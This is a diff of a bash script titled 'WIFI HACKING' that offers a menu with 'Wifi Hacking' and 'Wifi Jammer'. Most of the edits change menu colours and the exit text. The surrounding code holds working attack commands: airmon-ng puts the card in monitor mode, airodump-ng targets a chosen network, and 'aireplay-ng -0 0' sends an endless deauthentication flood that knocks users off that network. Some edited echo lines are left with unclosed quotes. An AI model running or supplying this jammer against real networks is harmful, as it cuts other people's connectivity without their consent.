@@ -26,13 +26,13 @@ sleep 1.7
 clear
 }
 option () {
-echo -e "$(tput setaf 3) \n              
+
         
-echo -e "$(tput setaf 4)\n                               [ WIFI HACKING ]
-echo -e "\n$(tput setaf 3)                        [ Select Option To Continue ]\n\n"
-echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 4)Wifi Hacking"
-echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi Jammer"
-echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
+echo -e "$(tput setaf 4)\n                                 [ WIFI HACKING ]
+echo -e "\n$(tput setaf 4)                        [ Select Option To Continue ]\n\n"
+echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 4)] $(tput setaf 4)Wifi Hacking"
+echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 4)] $(tput setaf 4)Wifi Jammer"
+echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 4)] $(tput setaf 4)Exit\n\n$(tput setaf 7)"
 }
 hacking () {
 airmon-ng start wlan0 > /dev/null
@@ -72,7 +72,7 @@ hacking
 airodump-ng --bssid $bssid --channel $ch wlan0mon
 aireplay-ng -0 0 -a $bssid wlan0mon 
     ;;
-  3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  3) echo -e "$(tput setaf 1)\n\033[1m,\nHappy Hacking :)\n"
      break;
     ;;
   *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
